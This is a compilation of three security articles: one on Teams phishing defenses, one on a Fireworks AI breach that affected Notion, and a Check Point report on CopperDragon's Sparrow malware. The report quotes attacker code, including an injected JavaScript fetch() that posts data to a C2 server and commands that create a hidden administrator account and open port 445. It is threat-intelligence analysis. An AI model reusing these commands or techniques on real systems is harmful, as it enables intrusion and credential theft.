Title: Chat Feels Safer Than Email. Attackers Are Counting on It.
Context: KnowBe4 Threat Labs turns real-world attack telemetry and more than 15 years of data into live detection models across the Email & Collaboration Security suite, so defenses...
Full Text:
Lead Analysts: Prabhakaran R and Jeewan Singh Jalal

You think twice before clicking a link in an unexpected email. Do you do the same for a message in Microsoft Teams?

A new message arrives in your Teams chat with the familiar notification sound, a participant’s name, and a link. It feels like a colleague, not a stranger. That feeling is the opening attackers look for.

Two things decide whether that message does harm. Can the channel stop it before it reaches your user? And if it gets through, does the user recognize the lure and know what to do? Both matter, and this post covers both.

Modern business depends on external collaboration across sales, finance, and IT. External access and guest participation are standard Teams features, not security oversights, and external access is open to all domains by default. Teams is also no longer where only people talk to people. A message could come from a colleague, an authorized AI agent/chabot, or an attacker, and most people have little to tell them apart.

Attackers exploit this openness by sending external messages that follow the same social engineering patterns as phishing emails and blend into your users' daily routine. They could also aim a message at an agent instead of a person. The question is no longer only whether a phishing message looks real. It is who and what you can trust at work.

KnowBe4 Threat Labs has consistently observed attackers imitating routine messages such as support requests, invoices, and meeting chat posts. Weekly detections grew from five in the week of June 22 to a peak of 301 in the week of September 28 (Figure 1). This post covers what we observed, what the attackers are after, and how the attacks play out.

What makes these messages effective is that a phishing message in chat looks like a routine work message: a link, a support request, a payment follow-up. People may not expect an attack on this channel, so they may take such messages at face value. The words alone rarely settle it. The better question is who is sending, from where and why.

Key Findings

Attackers follow work into Microsoft Teams. Chat and meetings now carry the lures that email has carried for years. Wherever your team works, attackers follow. A small request in chat is usually the first step toward a larger goal, such as device access, stolen money, or leverage for extortion.

Business needs keep the door open. Teams have to stay open to customers, vendors and partners, so blocking outsiders is neither practical nor enough. Attackers blend into that traffic, so judging the words alone is not reliable. Ask who is sending, from where, and why.

Teams have safeguards, but they depend on the user. Teams shows an external label and an Accept/Block prompt at first contact, and Microsoft Defender for Office 365 adds Safe Links and zero-hour auto purge where it is licensed. Attackers succeed when a user clicks through those warnings. Email has sender authentication, link analysis, and gateways. Conversations inside Teams sit outside the reach of third-party email gateways, and Teams chat gives fewer sender checks: display names are easy to choose, links can be disguised, and previews can mislead.

Defense has to cover the conversation and the click. Use both Microsoft's own settings and third-party protection as your technical controls. Train your users on this threat vector, so people know what a lure in Teams looks like and how to report it. Be ready to respond fast when a user acts on a message.

Why Are Attackers Moving Into Microsoft Teams?

Chat and meetings now carry the lures that email carried for years, and the following factors make Teams an attractive place for them.

Outside contact is normal. Your teams have to talk to customers, vendors, and partners, so external messages and guests are expected. A harmful message blends in with the many legitimate ones.

Impersonation is easy. Email has checks that block direct domain spoofing. Chat gives fewer sender-checking signals, and a sender can often choose the name users see.

Awareness is lower. Phishing awareness training has traditionally focused on email, so users may look harder at an unexpected email than at a chat message.

Email security doesn’t automatically cover Teams. Many security vendors now extend protection to collaboration tools. An organization that has not extended its controls to Teams leaves that channel uncovered.

One target list covers two channels. An attacker who already has a list of email addresses can reach the same people in Teams, where external access allows it, with little added effort. That gives them two channels to attack instead of one.

How Does an Attack in Teams Unfold?

Most attacks in a collaboration tool follow the same path, whatever the lure.

1. The attacker poses as a trusted contact. Display names are easy to choose, so the sender can appear as IT support, a vendor, or a colleague. A request from an individual account may show only the name the sender chose and an “External” label.

2. The attacker sends a lure. Default or permissive external-access settings let the message in, such as open external access, personal accounts that can start chats, or trial-only tenants that an admin has chosen to allow. The app, the notification and the chat context all look familiar, and the attacker can build the conversation slowly, so the request feels like a natural next step.

3. The user acts on the request. One step is enough: a click, a session started or a reply, because the request looks like routine work. Attackers may also call the user in Teams to talk them through the steps.

4. The user lands on a fake page or receives a payload. The user leaves Teams for the attacker’s web page, or a payload is delivered. A link can display one address and open another, and senders can edit a message after sending it, so what the user sees later may differ from the original.

5. The user hands over credentials, grants access, or pays. The fake page, tool, or payment request asks for one more action, and the user completes it.

6. The attacker gains access. The attacker now holds credentials, system access or the requested payment.

The attacker can then send the next lure through the compromised account, and the cycle repeats.

What Do Attackers Send in Teams, and What Do They Want?

The message types below are cases we observed. For each one, we describe what the attacker likely wants and where the activity can lead. The messages look different, but they serve a similar set of goals.

The “IT Support” Message

Why it works: Help desk requests feel routine, and people want their problem fixed. The user opens the session themselves, so the attacker gets access with the user’s approval.

What the attacker wants and where it leads: The likely goal is full control of the endpoint. Standard defenses often miss this because remote administration tools are legitimate software. With that access, an attacker can take saved passwords, active session cookies, and sensitive documents. This allows them to reach corporate email, Teams, and wider enterprise systems. It also gives them a foothold for lateral movement across internal networks and for deploying further remote monitoring and management (RMM) tools or ransomware.

2. The Urgent Invoice

Why it works: Payment requests with a deadline push people to act before they check, and a personal greeting makes the request feel real.

What the attacker wants and where it leads: The likely goal is money, stolen credentials, malware deployment, or all three. Depending on what the target does, that can mean payments sent to an attacker-controlled account, malware that steals credentials or sets up remote access, and the compromised account being used to send similar requests to colleagues or vendors.

3. The Ransom Note in Chat

Why it works: The message reaches the user directly, with no email gateway in its path.

What the attacker wants and where it leads: The likely goal is payment or an immediate response. The first message alone rarely shows whether the claim is real: it could follow a genuine compromise, or it could be a bluff meant to exploit fear and force a quick reply. Responding under pressure risks paying a ransom for nothing, overlooking an active breach if the claim is true, or causing internal panic when nothing was compromised.

What Should Defenders Do?

Protect messages and meetings, and be ready to respond fast when a user acts on a message. Start with your people, then your Teams settings.

How can users stop these messages?

1. Treat chat like email. Teach users to question links and requests in Teams, including in meeting chats.

2. Teach the “External” label. Ask users to check it before acting on a message that claims to come from support or leadership. For individual Microsoft accounts it can be one of the few cues available.

3. Preview before accepting. Teach users to read an external message request first and to decline it if it is unexpected, even when curiosity says otherwise.

4. Check the real link. Ask users to hover over a link and read the address before clicking, because the text shown can differ from the destination.

5. Never start a remote session someone sends you. Route support requests through the help desk.

6. Verify payment changes through a second channel. Confirm new payment details by phone with a known contact before paying.

7. Treat a ransom message as an incident. Report it to your security team and do not reply.

8. Stop sharing passwords in chat. Use a password manager or a one-time secret tool.

What if a user already acted?

Plan for the click. Reset the user’s password, revoke their active sessions, check for remote-access tools they installed, and review any payment they made.

How do you narrow the door in Teams?

Attackers can only message your users if your Teams settings allow it. You control those settings, and they are worth a review. Microsoft documents each one in its Teams external access guidance . Your business needs some outside contact, so the goal is not to block everyone. The goal is to allow the contact you need and nothing more. Start by reviewing which external tenants can message your users and who can join your meeting chats.

Settings to review

-AllowFederatedUsers: turns external communication with other organizations on or off.

-AllowedDomains and -BlockedDomains: limit access to trusted partners or block malicious domains.

-AllowTeamsConsumer and -AllowTeamsConsumerInbound: manage chat with unmanaged accounts and block uninvited outreach.

-AllowPublicUsers: controls chat with Skype users.

1. Allow only essential partner domains. Prefer allow-lists to block-lists, because block-lists only stop known threats. Blocking a main domain still leaves its subdomains open. To block all subdomains, run:

Set-CsTenantFederationConfiguration -BlockAllSubdomains $True

2. Block trial-only tenants. Unlicensed trial tenants are easy tools for attackers. Microsoft blocks them by default, but verify that your setting is still “Blocked”:

Set-CsTenantFederationConfiguration -ExternalAccessWithTrialTenants "Blocked"

When the setting is “Blocked,” users from trial-only tenants cannot search for, chat with, call or meet with your team, and they are removed from existing chats. Setting it to “Allowed” turns these safeguards off.

3. Restrict personal accounts. Personal Microsoft accounts are harder to verify: the sender chooses the display name, and no organization vouches for the account. Disable: AllowTeamsConsumerInbound to stop inbound chats from them, and evaluate AllowTeamsConsumer and -AllowPublicUsers against your needs.

4. Block malicious senders. You can block a harmful sender individually without changing global policy:

In the Teams admin center, go to Users > External access.

Turn on “Block specific users from communicating with people in my organization.”

Select “Block a user”, enter the person’s email address or messaging resource identifier (MRI), and select Apply.

The list holds a maximum of 200 users. You can also manage it with Set-CsTeamsExternalAccessConfiguration.

Where Can KnowBe4 Help?

Attackers move between channels, and a single campaign can use several. Reputation checks and sender history say little about a message from someone who has joined a meeting you are in. Protection has to read the message and respond when a user acts on it.

Multi-engine detection. KnowBe4 analyzes message text, sender relationships, links, and attachments at the same time, plus email headers when the message is an email. It checks what the message asks the user to do and how the sender relates to the recipient. A domain reputation check sees neither.

Coaching at the point of risk. Contextual coaching, real-time nudges, and localized banners and tags in 13 languages show users why a message looks suspicious at the moment it appears. According to KnowBe4 internal data, 97% of users stop before proceeding with a high-risk action when a teachable moment appears.

Title: Fireworks AI Confirms Wider Breach Affecting Customer Datasets, Model Weights and Notion AI Chats
Context: "Upon analysis of the new data, we discovered that it included Notion AI chat transcripts used for the Insights feature, which for the vast majority of impacted workspaces were...
Full Text:
Fireworks AI disclosed on Monday that its investigation into a security incident first reported early last month uncovered further malicious activity, affecting account and billing information, alongside secrets, datasets, and incomplete models for a "limited set of accounts."

In a notice published on October 10, 2026, the company said it detected unauthorized use of internal Fireworks credentials that allowed an unauthorized third-party to access environment variables used in evaluation jobs in a limited number of customer accounts. The activity was detected on October 6, 2026, at 9 a.m. PDT.

At that time, the AI infrastructure provider said it only found evidence that environment variables, including API keys and tokens stored as secrets, were captured in certain affected accounts, adding that there were no signs that customer models, datasets, training data, inference traffic, or personal information were accessed.

In response to the incident, Fireworks AI took the step of revoking the compromised internal credentials and rotating service account tokens, along with affected Fireworks API keys and keys created by the threat actor.

The latest bulletin from the company reveals that the scope of the breach may have been broader than previously thought. The company said attackers reached its development environment via an unnamed third-party cloud provider that hosted Fireworks research and development (R&D) machines on October 23, 2026.

"On October 24, the unauthorized third party used it to reach Fireworks development machines and then run an unauthorized workload that led to additional customer data impact," it added. "As of October 25, we have not detected further evidence of successful unauthorized access by the threat actor on the Fireworks platform customers use."

The breach is said to have provided access to the following types of information -

Resource metadata: Fireworks resource identifiers, display names, descriptions, and creation time

Billing information: billing and shipping addresses, invoice and payment history, account balance, and credit usage

Model weights and datasets: a subset of incomplete model weights and datasets for certain customers

Fireworks AI said payment card numbers are not stored by the company and were not impacted by the security incident. It also said it's alerting customers whose data was impacted.

The company also noted that it has implemented security hardening procedures, such as credential revocation and rotation; isolating affected systems to prevent further unauthorized activity and lateral movement; tightening access controls; and improving its logging and monitoring systems.

"The evidence indicates links to a cybercriminal threat actor group, which is financially motivated and aimed at selling tokens from unauthorized access to large language models (LLMs) to illicit routing gateways," it said.

The activity is assessed to be part of an emerging threat known as LLMjacking, which refers to the act of hijacking a victim's LLM through stolen credentials to fuel a criminal enterprise that thrives on peddling the access to other threat actors, while leaving the legitimate owner to pay the bill.

Last week, Google issued a warning that threat actors are increasingly targeting AI infrastructure for LLMjacking in North America, South America, and Asia Pacific across the financial services, retail, technology, and transportation sectors.

Notion Impacted by Fireworks AI Incident

Popular productivity and note-taking application Notion has disclosed that the security incident targeting Fireworks AI impacted "fewer than 1% of Notion workspaces." In a post shared on Reddit, one user said: "looks like all of us are part of that <1%."

While the initial assessment was that the breach allowed the threat actor to access Notion AI synthetic testing data, it has since come to light that it may also have involved potential customer data.

"Upon analysis of the new data, we discovered that it included Notion AI chat transcripts used for the Insights feature, which for the vast majority of impacted workspaces were unattributable," it said. "'Unattributable' means the chats weren't labeled with who wrote them or which workspace they came from, and the transcripts did not contain tool call results."

Notion has also emphasized that no other features across its platform were affected by the incident. The Insights feature has since been disabled as it continues to investigate the breach and the company is no longer serving open-weight models through Fireworks.

Affected customers are advised to review the impacted data securely inside their workspace. If those with affected workspaces have pasted sensitive information, passwords, API keys, or other credentials during the attack window, it's recommended to rotate them with immediate effect.

Title: Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe
Context: The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework
Full Text:
Key Points

During a year-long investigation, Check Point Research identified three distinct operational clusters spanning Latin America, Asia, and Europe targeting telecommunications providers, government organizations, military entities, research institutions, and critical infrastructure.

The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework.

We track the entity behind the Sparrow framework as CopperDragon, a potential digital quartermaster supporting China-nexus threat actors, including FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others.

Each cluster employed a different toolset and different initial access techniques, including compromising internet-facing infrastructure and highly selective watering-hole attacks. The compromised websites that were used for watering hole attacks were of government, shipping, and IT and research sectors.

Our research uncovered several previously undocumented tools and new details about the Sparrow framework, including Windows and Linux variants, passive backdoor capabilities, and a connection to the Melofee backdoor.

Introduction

Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace.

However, we identified numerous connections between the tools and their infrastructure which linked them to the same Sparrow malware ecosystem. We track the entity behind these campaigns as CopperDragon, which may serve as a digital quartermaster supporting a number of China-nexus threat actors that use the Sparrow cross-platform malware framework for Linux and Windows.

What is CopperDragon?

FamousSparrow is a threat actor that was first identified in 2021, whose main backdoor is SparrowDoor. Since then, multiple vendors have reported on related activity and malware variants, including CrowDoor, HemiGate, and TernDoor.

Over time, it became apparent that this other activity was not necessarily carried out by the original FamousSparrow group. Instead, reporting pointed to several distinct actors using a shared toolset, potentially supplied by the same entity. These actors include FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others. FamousSparrow was previously also linked to Salt Typhoon, but the relationship details remain unclear. Based on the apparent tool-sharing, we began tracking the entity behind the Sparrow framework as CopperDragon, its possible developer and supplier.

In this report, we examine three distinct activity clusters targeting major telecommunications providers, government organizations, and military entities. Together, these operations provide a broader view of the connected and evolving espionage ecosystem linked to CopperDragon:

SilentDelivery uses highly selective watering-hole attacks that distribute the SquadC backdoor through Trojanized MSI installers masquerading as certificate repair utilities. This cluster focuses on Europe and Asia regions.

OceanGate focuses primarily on Asian organizations and uses a variant of SparrowDoor. The actor first compromised internet-facing Linux systems before moving laterally into Windows environments, using a broad set of post-exploitation tools for both operating systems.

DarkWire targets telecommunications providers and government organizations across Latin America, using CopperDoor and CopperDNS as its main backdoors.

Figure 1 – Geographic distribution of Sparrow framework victims.

SilentDelivery: Selective Watering-Hole Attacks

Beginning in early 2026, we started tracking new activity related to CopperDragon that introduces a unique initial access methodology, using watering-hole attacks that target high-profile organizations mainly in Europe and Asia. We track this activity as the SilentDelivery operation. While we were finalizing this report, part of this cluster was also reported by Positive Technologies.

Figure 2 – SilentDelivery infection chain.

The attackers first compromised legitimate websites frequently visited by their intended targets. When a victim visited one of these websites, a heavily obfuscated JavaScript payload injected into the page completely replaced the legitimate content with a Google Chrome SSL certificate warning customized to the website’s language. The fake warning blocked access to the website and instructed the user to install a “Certificate Fix” utility. This utility deployed either a previously undocumented backdoor called SquadC or, in some cases, a variant of SparrowDoor.

Figure 3 – A fake Chrome certificate error page with an added “Install certificate” button.

Compromised websites

All the compromised websites we confirmed were related to the government, shipping, and IT and research sectors. In one case, the website was exploited using an XSS attack on an unsensitized input field. Based on Check Point telemetry, the operations primarily targeted organizations in countries such as the Czech Republic, Germany, France, Taiwan, Nepal, Hong Kong and Indonesia.

Figure 4 – A newer version of Chrome’s certificate error appearing in different languages.

Across the analyzed websites, we also identified three S3 buckets that we believe were compromised by the threat actor. These buckets hosted the next-stage backdoor, which was downloaded when the user clicked the “Install certificate” button.

JavaScript Analysis

The JavaScript injected into the compromised websites is heavily obfuscated using jsjiami, a publicly available JavaScript obfuscation service. It first checks whether the user is running Windows and, in some cases, verifies that the website’s domain matches the intended compromised domain.

Figure 5 – Deobfuscated JavaScript checking if the browser is a Windows host.

The script then starts a loop that repeatedly sends status-check requests to the C2 (command and control) server at /image-check?t=<datetime>. These requests are used to fingerprint the user based on IP and geolocation and determine whether to continue the attack and hijack the webpage. They also enable the threat actor to control the attack and stop displaying the fake certificate error after a successful compromise, thus reducing the likelihood of raising the user’s suspicions. If the server returns HTTP 200, the webpage is left unchanged and the user can access the website normally. If the server does not respond, the script hijacks the webpage and displays the fake certificate error.

When the user clicks “Install certificate”, the script sends a POST request to the C2 server at /report-url. This request reports the click and includes the compromised website’s URL in its JSON body. At the same time, the script initiates the download of an MSI package containing the next-stage backdoor from an attacker-controlled S3 bucket.

fetch(serverUrl + "/report-url", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: window.location.href }) });

After the user executes the backdoor, it sends a request to the C2 server at /register-ip, indicating a successful compromise. The fake certificate error will not appear the next time the user visits the compromised website.

Stage

User Action

Reporting

1

Visits compromised site

JavaScript → /image-check?t=<datetime>

2

Clicks “Install certificate”

JavaScript → /report-url

3

Executes backdoor

Backdoor → /register-ip

SquadC backdoor

SquadC is a Windows backdoor written in C/C++ that provides operators with basic remote control over a compromised host. The backdoor is loaded in memory using a separate loader component that decrypts and loads it through a three-stage process. The name SquadC is derived from an internal reference left by the author in the sample:

Figure 6 – Internal reference identifying the backdoor as SquadC.

Depending on its configuration, the backdoor supports several flags, including one that enables checks to avoid execution in sandbox environments. These checks look for VM artifacts in the file system and Windows registry, as well as blacklisted MAC addresses and specific screen resolutions and disk sizes.

As an additional measure to evade sandboxes and automated analysis, the backdoor can be configured to run only if a browser is currently running on the host. As the backdoor is downloaded through a browser during the infection, it’s expected that a browser remains open. The check is done by enumerating running process names and comparing them against a fixed list of browsers:

browser_list = [chrome.exe, msedge.exe, edge.exe, firefox.exe, brave.exe]

To survive host reboots, the backdoor achieves persistence by manipulating the registry Run key under a key WindowsUpdateAssist.

The backdoor supports a small set of commands for command execution and file system management and serves mainly as an initial foothold in the compromised host.

These commands are supported by SquadC:

SquadC in phishing attacks

While hunting for related files, we identified an additional way to distribute SquadC through spear phishing. We found a compressed archive named Strategi_AS_Referensi_April2026.rar, uploaded to VirusTotal from Indonesia which aligns with Indonesian organizations observed in watering-hole activity. The backdoor was configured to communicate with the same IP address used in the watering-hole infection chain, suggesting that both activities were linked to the same threat actor.

The archive contains four files:

Strategi_AS_Referensi_April2026.docx.lnk – An LNK file abusing the ftp.exe LOLBin for command execution.

_rels/info.dll – A batch script executed using ftp.exe:

Figure 7 – info.dll file content.

_rels/.rels.log – A cab file containing the SquadC loader components:

Figure 8 – SquadC loader components in the .rels.log CAB file.

_rels/557.pdf – An empty file.

When the LNK file is executed, it runs a series of CMD commands to extract and execute the SquadC backdoor. It also opens a decoy document, which in this case is an empty file.

SilentDelivery Infrastructure

The SilentDelivery operation was attributed to CopperDragon based on two primary observations:

In some cases, the final payload was a variant of SparrowDoor. Even in cases involving SquadC, the DLL used to load the backdoor was previously used in the FamousSparrow toolset.

The C2 infrastructure of SquadC shares several characteristics with infrastructure associated with FamousSparrow, including server layout, exposed services and ports, HTTP response banners, and reused TLS certificates.

Subject: C=US ST=US L=Oregon O=VeriSign Class 3 Code Signing 2010 CA OU=VeriSign Class 3 Code Signing 2010 CA CN=VeriSign Trust Network Issuer: C=US ST=US L=Santa Clara O=McAfee, Inc. OU=McAfee, Inc. CN=McAfee, Inc. Serial Number: 0x4872589ca964eac0776b1e9617e9813cb1da49dc Not Before: 2023-04-28 11:13:39 Not After: 2024-04-27 11:13:39 Fingerprint SHA-1: 760be920fad07881b8ce9d94e074a35b4f806717

TLS certificate reused across SilentDelivery and OceanGate C2 infrastructure.

OceanGate: From Linux Initial Access to Domain Administrator

The OceanGate operation was observed during 2025-2026 primarily targeting government organizations and critical infrastructure in Asia. Some activity was also seen in other regions. The operation followed a more common intrusion pattern, with tooling and operational TTPs (Tactics, Techniques, and Procedures) consistent with those previously reported by multiple vendors and tracked as FamousSparrow.

In this attack, the threat actor operated across both Linux and Windows environments, deploying several previously unreported tools to maintain access and move across the compromised network. The operation involved extensive credential theft, lateral movement, data staging, and exfiltration of sensitive operational information. The Linux activity was particularly interesting, given the limited reporting on how the actor operates in these environments and the tools it uses.

Linux operation

The intrusion began with the exploitation of a vulnerable internet-facing Linux server, followed by the deployment of two new backdoors: AnnobinDoor and SparrowShell.

Figure 9 – OceanGate cluster: Linux attack chain diagram.

AnnobinDoor

The first backdoor deployed after initial access was AnnobinDoor, a statically linked, Go-based backdoor packed with UPX and internally named annobinagent. By default, it uses WebSocket but also supports HTTP and raw TCP. Its requests include browser-like headers and standard WebSocket upgrade fields, which helps the traffic resemble legitimate application communications.

The backdoor provides a broad range of remote access and pivoting capabilities, including an interactive shell, file management, SOCKS proxying, SSH tunneling, port forwarding, and reverse connections.

Together, these features allow the infected Linux host to function as both a remote shell and an internal network pivot.

SparrowShell

Later in the attack, the actor also deployed another backdoor we named SparrowShell. SparrowShell is a modular Linux backdoor that shares significant design and code similarities with the Windows backdoor SparrowDoor. The two belong to the same cross-platform malware family, with versions developed for Linux and Windows. They share the same C2 infrastructure and RC4 decryption keys, as well as similar command-line arguments and comparable plugin-based architectures.

These commands are supported by SparrowShell:

Command ID

Direction

Description

0x1001

Sends host fingerprint (OS, IPs, user, hostname, timestamp, host ID). Waits for magic value 0x11223344 to confirm the connection and mark the C2 as active.

0x1002

Requests a plugin module from the C2. Receives encrypted blob, decrypts it, saves to /tmp/%x, loads via dlopen, executes xmain, then deletes it from disk.

0x1003

Sends additional host identifier/hash. Connection is validated based on the C2 response (0x11223344) or dropped if invalid.

0x100A

Trojanized SSH tools

A few days later, the threat actor replaced the legitimate SSH client and SSHD components on the server with Trojanized versions designed to log credentials during administrative activity. This allowed the actor to harvest credentials from multiple users and move to other Linux hosts on the network, where the same technique was used again.

Public tools

Besides custom tools and scripts, the threat actor also used popular publicly available tools, including FRPC and Chisel, which provided additional channels for remote access and internal pivoting. The actor also used ASimplePortScanner, an open-source Python scanner, to discover additional hosts in the network.

Windows Operation

Figure 10 – OceanGate: Lateral movement to Windows environment and tool deployment.

After harvesting credentials from multiple users and establishing a strong foothold in the Linux environment, the actor moved into the Windows environment.

The actor attempted to log in to several Windows machines over RDP, trying different passwords until it successfully authenticated with an administrator account. It then deployed a set of custom post exploitation tools before deploying the final windows backdoor a variant of SparrowDoor.

CopperAdu

CopperAdu is a post-exploitation tool that configures a compromised Windows host for remote administrative access, preparing it for further attacker activity.

It creates a local account with hardcoded credentials, disables password expiration, and adds the account to the local Administrators group. It also modifies the registry to hide the account from the standard Windows logon interface.

The tool sets LocalAccountTokenFilterPolicy to 1, allowing remote connections using local administrator accounts to retain full administrative privileges and facilitating lateral movement.

Finally, CopperAdu enables the LanmanServer and LanmanWorkstation services and configures an inbound Windows Firewall rule to allow SMB traffic on TCP port 445.

net user admin$ "Admin@123456" /add /expires:never /passwordchg:no wmic useraccount where "Name='admin$'" set PasswordExpires=false net localgroup administrators admin$ /add sc config LanmanServer start= auto sc start LanmanServer sc config LanmanWorkstation start= auto sc start LanmanWorkstation netsh advfirewall firewall delete rule name = "RasiUwpApp" netsh advfirewall firewall add rule name="RasiUwpApp" dir=in action=allow protocol=TCP localport=445 profile=any

CopperList

The actor then deployed CopperList, a Windows reconnaissance tool that collects host information, disk details, and a recursive file inventory, including file paths, sizes, and timestamps. It scans fixed drives while excluding common system and application directories, focusing on user data and potentially sensitive files. The collected information is compressed using LZNT1 and staged for exfiltration by other attacker-deployed components.

Figure 11 – CopperList output on a test machine.

CopperLogger

On some hosts, the actor deployed CopperLogger, a Raw Input-based keylogger. It registers a hidden window (kbl) and subscribes to keyboard input events, allowing it to capture keystrokes regardless of which application is in focus.

Beyond keystroke logging, the malware also collects contextual information, including:

Active window titles

Associated process names and paths

User session context

In addition, the malware monitors clipboard activity involving copying and pasting, and stores it alongside the keystroke data.

CopperLsa

For credential theft on Windows systems, the actor deployed CopperLsa, a tool that collects credentials directly through the Windows authentication flow. Its loader decrypts two embedded DLLs: one installs a custom LSA security package inside LSASS, while the other collects passwords, hashes, and authentication tokens from several authentication mechanisms, including NTLM and Kerberos. The stolen credentials are saved to a log file at a location chosen by the operator.

Kernel-level capabilities

In some cases, we observed the actor adding kernel rootkits and kernel-level access capabilities to its main backdoors: SparrowDoor for Windows and SparrowShell for Linux.

SparrowShell kernel rootkit

SparrowShell supports integration with an embedded kernel rootkit. When executed with the hide flag, the backdoor locates an appended encrypted blob, decrypts it, and loads it into memory as a kernel module using the init_module system call.

The kernel component is a modified version of the open-source Reptile rootkit and supports capabilities such as hiding files, processes, and network activity. Communication between user space and the rootkit uses a custom ioctl interface with the ID 0x0e0e0e0e.

Figure 12 – Reptile rootkit that SparrowShell is based on.

Passive Sparrow backdoor

Some observed versions of the Windows backdoor SparrowDoor include kernel-level packet interception capabilities, with WinDivert drivers embedded as resources for x86 and x64. WinDivert is a legitimate driver for network packet capture and manipulation, and is commonly used by utilities such as VPNs, firewalls, and tunneling applications.

Figure 13 – Passive Sparrow communication scheme.

The actor abused the driver to convert SparrowDoor into a passive backdoor that intercepts and manipulates packets at the kernel level, making its traffic less visible. This allows the backdoor to listen internally on one port while receiving connections through an externally accessible port, such as 443, that is already used by a legitimate service.

The backdoor applies a strict filter to intercept connections from a specific source IP address to the legitimate service’s port. It manipulates the packet and rewrites the destination port to the backdoor’s internal listening port, typically a high port such as 49628. For response traffic, it rewrites the source port back to the external service port, making the responses appear to originate from the legitimate service.

( (inbound and tcp.DstPort == %d // Legitimate external listening port and ip.SrcAddr == %s) or // Connections from a specific source IP (outbound and tcp.SrcPort == %d) // Backdoor's internal listening port )

Incoming connections are checked for the magic value 0x11223344. Matching requests are queued for backdoor command processing, while nonmatching traffic is forwarded to the legitimate service at 127.0.0.1:<external_port>, allowing normal connections to continue functioning.

Melofee

While analyzing SparrowShell, we identified several similarities with the Melofee backdoor, which was first discovered in 2023. Both use similarly modified versions of the open-source Reptile rootkit and share code similarities in how they decrypt, load, and activate the rootkit. They also support the same hide and show command-line arguments for rootkit control. These similarities led some vendors to classify SparrowShell as Melofee.

The connection between Melofee and CopperDragon’s SparrowShell became stronger when we analyzed Melofee samples that also shared infrastructure characteristics, particularly in their self-signed certificates. Both used certificate subject values such as Some-State and O=Internet Widgits Pty Ltd and impersonated public DNS servers in the common name (CN) field. Both also used certificates created years earlier that remained in use long after their expiration.

Figure 14 – TernDoor certificate from Talos blog 2026.

Figure 15 – Melofee certificate on Virus Total from 2026.

Based on these findings, including code similarities and infrastructure overlaps, we assess that CopperDragon is also involved in maintaining and supplying Melofee variants.

DarkWire: Compromising Telecommunications Providers

Figure 16 – DarkWire toolset.

In mid-2025, we identified a new wave of activity, tracked as DarkWire. While initially concentrated in Latin America, more recent intrusions suggest expansion beyond the region. Victimology indicates a clear focus on telecommunications operators and government entities, including at least three major telecom providers in the region, as well as the foreign affairs and justice sectors.

Throughout our investigation, we uncovered multiple custom tools, suggesting the actor maintains a broader proprietary toolkit. The actor deployed two newly identified backdoors, which we named CopperDoor and CopperDNS. These appear to function as the group’s primary implants and may have replaced the SparrowDoor family.

Beyond these backdoors, the actor was observed deploying several additional custom tools, including proxy utilities such as CopperProxy and PyProxy, as well as CopperLsass, a dedicated module used to dump the LSASS process for credential harvesting. Most of the post exploitation tools including the new backdoors were loaded by a unique loader we named CopperLoader.

Alongside these tools, the operators also employed publicly available software, such as SoftEther VPN renamed to names like vmtoolsd.exe and csrss.exe. For lateral movement, they transferred files over SMB and executed remote commands via WMI, using wmiexec.

CopperLoader

CopperLoader is a reflective loader typically deployed through DLL sideloading. It consists of position-independent shellcode written into a modified version of the original DLL being hijacked. In some cases, CopperLoader was not the initial sideloaded component, but arrived as a second-stage shellcode payload delivered by another shellcode loader.

CopperLoader loads an encrypted next-stage PE module from a .dat file in its directory. These files contain the next-stage module in encrypted form. While the exact layout varies across samples, a consistent set of embedded headers provides the information needed to process each payload: module length, RC4 decryption key, and in some cases, the backdoor configuration.

The MZ and PE signatures were removed in the decrypted module, hindering memory scanning and automated extraction.

We observed CopperLoader delivering four unique tools: CopperDoor, CopperDNS, CopperProxy, and CopperLsass.

CopperDoor & CopperDNS

The main backdoor used in the DarkWire operation was CopperDoor, a newly identified advanced modular backdoor that resides entirely in memory. CopperDoor uses some novel techniques such as call stack spoofing and gadget-based execution for EDR evasions. The malware, also known as SparroWocky, was recently analyzed in depth by ESET as part of its research into FamousSparrow activity.

Alongside CopperDoor, we also observed a variant of the backdoor that communicates through DNS tunneling using MX queries, which we named CopperDNS.

Figure 17 – DNS Tunneling send flow in CopperDNS.

CopperProxy & PyProxy

CopperProxy is a SOCKS5 proxy tool. It accepts an IP address and TCP port as command-line arguments, configures a Windows Firewall rule named ss1 for the specified port, and listens for incoming connections, supporting up to 300 concurrent clients. For each connection, it handles SOCKS5 negotiation, connects to the requested destination, and relays traffic in both directions.

PyProxy is a lightweight UDP relay written in Python and packaged as a standalone executable using PyInstaller. It listens on a fixed local UDP port and relays traffic in both directions between local clients and a hardcoded remote IP address and port.

Figure 18 – Decompiled PyProxy python code.

CopperLsass

CopperLsass is a DLL module that loads a component named slave.dll into LSASS by registering it as a security package through RPC. Once inside LSASS, slave.dll uses the Windows library comsvcs.dll and a helper DLL, dep.dll to create a full LSASS memory dump, encrypt it using a custom SUB-XOR-ADD algorithm, and delete the original dump. In observed intrusions, the encrypted file was renamed to 1.png before exfiltration to resemble an image file.

Execution and Staging

The operation heavily relies on DLL sideloading as a primary execution technique, often abusing executables that are not widely observed among other threat actors in the wild.

The executables we observed in use include:

DLL Name

Original EXE Name

ncpmif32.dll

ncptrcw.exe

winfsp.dll

fsptool.exe

libvlccore.dll

vlc.exe

DukeQt.dll

gethwid.exe

zCrashReport64.dll

zCrashReport64.exe

To minimize their footprint, the operators deliberately avoided creating new directories on disk, instead placing their tools within existing system paths.

The file paths we observed in use:

Path

C:\Program Files\7-Zip\Lang

C:\Windows\debug

C:\Windows\System32

C:\ProgramData\vmware\logs

C:\ProgramData\Oracle\Java

C:\ProgramData\USOShared

C:\ProgramData\Waves

DarkWire Infrastructure

CopperDoor infrastructure demonstrated a higher level of operational security. The associated IP addresses were distributed across a variety of autonomous systems. These servers typically exposed port 443, with communications conducted over raw TCP encapsulated in TLS instead of standard HTTPS. In several cases, the TLS certificates deployed on these C2 servers contained Common Name (CN) values that closely mimic domains associated with the targeted victim organizations.

ASN

